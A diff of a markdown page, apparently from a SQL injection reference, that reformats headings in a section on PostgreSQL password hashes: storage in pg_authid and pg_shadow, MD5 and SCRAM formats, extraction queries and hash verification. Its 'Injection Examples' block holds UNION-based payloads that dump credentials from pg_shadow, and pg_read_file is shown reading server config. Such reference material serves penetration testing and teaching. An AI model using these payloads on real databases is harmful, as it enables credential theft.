@@ -7,11 +7,9 @@ tags: ["password", "hashing", "authentication"]
 lastUpdated: 2025-12-16
 ---
 
-## Password Hashing
-
 Understanding how PostgreSQL stores passwords is crucial for exploiting extracted credentials. PostgreSQL has evolved its password hashing mechanisms over time.
 
-### Password Storage Location
+## Password Storage Location
 
 PostgreSQL stores password hashes in the `pg_authid` system catalog (rolpassword column). The `pg_shadow` view is a backwards-compatibility layer that exposes this data for legacy clients. Prior to PostgreSQL 8.1, `pg_shadow` was a physical table; in 8.1 and later, it's a view over `pg_authid`. Both require superuser privileges to access.
 
@@ -23,7 +21,7 @@ SELECT rolname, rolpassword FROM pg_authid WHERE rolcanlogin;
 SELECT usename, passwd FROM pg_shadow;
 ```
 
-### Hash Formats
+## Hash Formats
 
 PostgreSQL supports multiple password hash formats:
 
@@ -33,7 +31,7 @@ PostgreSQL supports multiple password hash formats:
 | SCRAM-SHA-256 | 10+ (default in 14+) | SCRAM authentication               |
 | Plain text    | Deprecated           | Cleartext (very old installations) |
 
-### MD5 Hash Format
+## MD5 Hash Format
 
 The traditional PostgreSQL MD5 hash:
 
@@ -55,7 +53,7 @@ SELECT 'md5' || md5('secretpostgres');
 -- Result: md5d578ec61fc8a2bdbe7df2c3096b34e02
 ```
 
-### SCRAM-SHA-256 Format
+## SCRAM-SHA-256 Format
 
 Modern PostgreSQL uses SCRAM-SHA-256:
 
@@ -76,7 +74,7 @@ Where:
 - **StoredKey**: Base64-encoded derived key used for client authentication
 - **ServerKey**: Base64-encoded server verification key
 
-### Extracting Password Hashes
+## Extracting Password Hashes
 
 ```sql
 -- Get all password hashes (requires superuser)
@@ -92,7 +90,7 @@ SELECT usename, passwd FROM pg_shadow WHERE passwd LIKE 'md5%';
 SELECT usename, passwd FROM pg_shadow WHERE passwd LIKE 'SCRAM%';
 ```
 
-### Injection Examples
+## Injection Examples
 
 ```sql
 -- Extract all credentials
@@ -105,7 +103,7 @@ SELECT usename, passwd FROM pg_shadow WHERE passwd LIKE 'SCRAM%';
 ' UNION SELECT NULL,CASE WHEN passwd LIKE 'md5%' THEN 'MD5' WHEN passwd LIKE 'SCRAM%' THEN 'SCRAM' ELSE 'UNKNOWN' END,NULL FROM pg_shadow WHERE usename='postgres'--
 ```
 
-### Checking Password Encryption Setting
+## Checking Password Encryption Setting
 
 ```sql
 -- Check current setting
@@ -120,7 +118,7 @@ Possible values:
 - `md5` - Use MD5 hashing
 - `scram-sha-256` - Use SCRAM-SHA-256 (default in PostgreSQL 14+)
 
-### Creating Test Hashes
+## Creating Test Hashes
 
 For verification purposes:
 
@@ -131,7 +129,7 @@ SELECT 'md5' || md5('password' || 'username');
 -- This matches how PostgreSQL stores MD5 passwords
 ```
 
-### Verifying Extracted Hashes
+## Verifying Extracted Hashes
 
 To verify an MD5 hash is valid:
 
@@ -144,7 +142,7 @@ expected_hash = 'md5' + hashlib.md5((password + username).encode('utf-8')).hexdi
 print(expected_hash)
 ```
 
-### Authentication Methods
+## Authentication Methods
 
 Check `pg_hba.conf` for authentication methods:
 
@@ -158,7 +156,7 @@ SELECT pg_read_file(current_setting('hba_file'));
 
 **Security warning:** `pg_read_file()` requires superuser privileges (or `pg_read_server_files` role in PostgreSQL 11+) and can read arbitrary files from the server filesystem. This creates significant information-disclosure risk if credentials are compromised. Restrict superuser access and avoid using this function in untrusted environments.
 
-### Notes
+## Notes
 
 - `pg_shadow` is only accessible to superusers
 - MD5 hashes include the username, making rainbow tables less effective
